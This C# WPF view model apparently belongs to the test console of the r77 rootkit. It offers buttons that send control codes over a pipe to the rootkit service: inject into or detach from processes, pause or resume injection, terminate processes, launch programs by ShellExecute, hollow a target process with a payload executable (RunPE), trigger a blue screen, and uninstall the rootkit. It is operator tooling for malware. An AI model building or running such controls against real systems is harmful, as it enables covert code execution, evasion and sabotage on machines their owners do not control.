using BytecodeApi.Extensions;
using BytecodeApi.Wpf;
using BytecodeApi.Wpf.Dialogs;
using System.IO;
using System.Windows;
using TestConsole.Helper;
using TestConsole.Model;

namespace TestConsole;

public sealed class ControlPipeUserControlViewModel : ViewModel
{
	public ControlPipeUserControl View { get; set; }

	private DelegateCommand? _R77TerminateServiceCommand;
	private DelegateCommand? _R77UninstallCommand;
	private DelegateCommand? _R77PauseInjectionCommand;
	private DelegateCommand? _R77ResumeInjectionCommand;
	private DelegateCommand? _ProcessesInjectCommand;
	private DelegateCommand? _ProcessesInjectAllCommand;
	private DelegateCommand? _ProcessesDetachCommand;
	private DelegateCommand? _ProcessesDetachAllCommand;
	private DelegateCommand? _ProcessesTerminateIdCommand;
	private DelegateCommand? _ProcessesTerminateNameCommand;
	private DelegateCommand? _UserShellExecCommand;
	private DelegateCommand? _UserRunPECommand;
	private DelegateCommand? _SystemBsodCommand;
	public DelegateCommand R77TerminateServiceCommand => _R77TerminateServiceCommand ??= new(R77TerminateServiceCommand_Execute);
	public DelegateCommand R77UninstallCommand => _R77UninstallCommand ??= new(R77UninstallCommand_Execute);
	public DelegateCommand R77PauseInjectionCommand => _R77PauseInjectionCommand ??= new(R77PauseInjectionCommand_Execute);
	public DelegateCommand R77ResumeInjectionCommand => _R77ResumeInjectionCommand ??= new(R77ResumeInjectionCommand_Execute);
	public DelegateCommand ProcessesInjectCommand => _ProcessesInjectCommand ??= new(ProcessesInjectCommand_Execute, ProcessesInjectCommand_CanExecute);
	public DelegateCommand ProcessesInjectAllCommand => _ProcessesInjectAllCommand ??= new(ProcessesInjectAllCommand_Execute);
	public DelegateCommand ProcessesDetachCommand => _ProcessesDetachCommand ??= new(ProcessesDetachCommand_Execute, ProcessesDetachCommand_CanExecute);
	public DelegateCommand ProcessesDetachAllCommand => _ProcessesDetachAllCommand ??= new(ProcessesDetachAllCommand_Execute);
	public DelegateCommand ProcessesTerminateIdCommand => _ProcessesTerminateIdCommand ??= new(ProcessesTerminateIdCommand_Execute, ProcessesTerminateIdCommand_CanExecute);
	public DelegateCommand ProcessesTerminateNameCommand => _ProcessesTerminateNameCommand ??= new(ProcessesTerminateNameCommand_Execute, ProcessesTerminateNameCommand_CanExecute);
	public DelegateCommand UserShellExecCommand => _UserShellExecCommand ??= new(UserShellExecCommand_Execute);
	public DelegateCommand UserRunPECommand => _UserRunPECommand ??= new(UserRunPECommand_Execute);
	public DelegateCommand SystemBsodCommand => _SystemBsodCommand ??= new(SystemBsodCommand_Execute);

	private bool _IsR77ServiceRunning;
	private int? _InjectProcessId;
	private int? _DetachProcessId;
	private int? _TerminateProcessId;
	private string? _TerminateProcessName;
	private string? _ShellExecPath;
	private string? _ShellExecCommandLine;
	private string? _RunPETargetPath;
	private string? _RunPEPayloadPath;
	public bool IsR77ServiceRunning
	{
		get => _IsR77ServiceRunning;
		set => Set(ref _IsR77ServiceRunning, value);
	}
	public int? InjectProcessId
	{
		get => _InjectProcessId;
		set => Set(ref _InjectProcessId, value);
	}
	public int? DetachProcessId
	{
		get => _DetachProcessId;
		set => Set(ref _DetachProcessId, value);
	}
	public int? TerminateProcessId
	{
		get => _TerminateProcessId;
		set => Set(ref _TerminateProcessId, value);
	}
	public string? TerminateProcessName
	{
		get => _TerminateProcessName;
		set => Set(ref _TerminateProcessName, value);
	}
	public string? ShellExecPath
	{
		get => _ShellExecPath;
		set => Set(ref _ShellExecPath, value);
	}
	public string? ShellExecCommandLine
	{
		get => _ShellExecCommandLine;
		set => Set(ref _ShellExecCommandLine, value);
	}
	public string? RunPETargetPath
	{
		get => _RunPETargetPath;
		set => Set(ref _RunPETargetPath, value);
	}
	public string? RunPEPayloadPath
	{
		get => _RunPEPayloadPath;
		set => Set(ref _RunPEPayloadPath, value);
	}

	public ControlPipeUserControlViewModel(ControlPipeUserControl view)
	{
		View = view;

		BeginUpdate();
	}

	private async void BeginUpdate()
	{
		while (true)
		{
			IsR77ServiceRunning = R77ServiceUserControlViewModel.Singleton?.IsR77ServiceRunning == true;
			await Task.Delay(100);
		}
	}

	private void R77TerminateServiceCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77TerminateService);
	}
	private void R77UninstallCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77Uninstall);
	}
	private void R77PauseInjectionCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77PauseInjection);
	}
	private void R77ResumeInjectionCommand_Execute()
	{
		ControlPipe.Write(ControlCode.R77ResumeInjection);
	}
	private bool ProcessesInjectCommand_CanExecute()
	{
		return InjectProcessId != null;
	}
	private void ProcessesInjectCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesInject, BitConverter.GetBytes(InjectProcessId!.Value), InjectProcessId.ToString());
	}
	private void ProcessesInjectAllCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesInjectAll);
	}
	private bool ProcessesDetachCommand_CanExecute()
	{
		return DetachProcessId != null;
	}
	private void ProcessesDetachCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesDetach, BitConverter.GetBytes(DetachProcessId!.Value), DetachProcessId.ToString());
	}
	private void ProcessesDetachAllCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesDetachAll);
	}
	private bool ProcessesTerminateIdCommand_CanExecute()
	{
		return TerminateProcessId != null;
	}
	private void ProcessesTerminateIdCommand_Execute()
	{
		ControlPipe.Write(ControlCode.ProcessesTerminateId, BitConverter.GetBytes(TerminateProcessId!.Value), TerminateProcessId.ToString());
	}
	private bool ProcessesTerminateNameCommand_CanExecute()
	{
		return TerminateProcessName != null;
	}
	private void ProcessesTerminateNameCommand_Execute()
	{
		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(TerminateProcessName!.ToUnicodeBytes());
		writer.Write((short)0);

		ControlPipe.Write(ControlCode.ProcessesTerminateName, memoryStream.ToArray(), TerminateProcessName);
	}
	private void UserShellExecCommand_Execute()
	{
		ShellExecPath = ShellExecPath?.Trim().ToNullIfEmpty();
		ShellExecCommandLine = ShellExecCommandLine?.Trim().ToNullIfEmpty();

		if (ShellExecPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.UserShellExec.GetDescription() ?? ""),
				new LogTextItem("Specify a path.")
			);
			return;
		}

		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(ShellExecPath.ToUnicodeBytes());
		writer.Write((short)0);
		if (ShellExecCommandLine != null) writer.Write(ShellExecCommandLine.ToUnicodeBytes());
		writer.Write((short)0);

		ControlPipe.Write(ControlCode.UserShellExec, memoryStream.ToArray(), ShellExecPath + (ShellExecCommandLine == null ? null : $" {ShellExecCommandLine}"));
	}
	private void UserRunPECommand_Execute()
	{
		RunPETargetPath = RunPETargetPath?.Trim().ToNullIfEmpty();
		RunPEPayloadPath = RunPEPayloadPath?.Trim().ToNullIfEmpty();

		if (RunPETargetPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.UserRunPE.GetDescription() ?? ""),
				new LogTextItem("Specify a target path.")
			);
			return;
		}

		if (!File.Exists(RunPETargetPath))
		{
			Log.Error(
				new LogTextItem("File"),
				new LogFileItem(Path.GetFileName(RunPETargetPath)),
				new LogTextItem("not found.")
			);
			return;
		}

		if (RunPEPayloadPath == null)
		{
			Log.Error(
				new LogFileItem(ControlCode.UserRunPE.GetDescription() ?? ""),
				new LogTextItem("Specify a payload.")
			);
			return;
		}

		if (!File.Exists(RunPEPayloadPath))
		{
			Log.Error(
				new LogTextItem("File"),
				new LogFileItem(Path.GetFileName(RunPEPayloadPath)),
				new LogTextItem("not found.")
			);
			return;
		}

		using MemoryStream memoryStream = new();
		using BinaryWriter writer = new(memoryStream);

		writer.Write(RunPETargetPath.ToUnicodeBytes());
		writer.Write((short)0);
		writer.Write((int)new FileInfo(RunPEPayloadPath).Length);
		writer.Write(File.ReadAllBytes(RunPEPayloadPath));

		ControlPipe.Write(ControlCode.UserRunPE, memoryStream.ToArray(), Path.GetFileName(RunPEPayloadPath) + " -> " + Path.GetFileName(RunPETargetPath));
	}
	private void SystemBsodCommand_Execute()
	{
		if (Dialog
			.Title("BSOD")
			.Text("This command will trigger a blue screen.")
			.Icon(DialogIcon.ShieldWarningYellowBar)
			.CommandLink(DialogResult.Yes, "Trigger BSOD")
			.Button(DialogResult.Cancel)
			.Show(Window.GetWindow(View)) == DialogResult.Yes)
		{
			ControlPipe.Write(ControlCode.SystemBsod);
		}
	}
}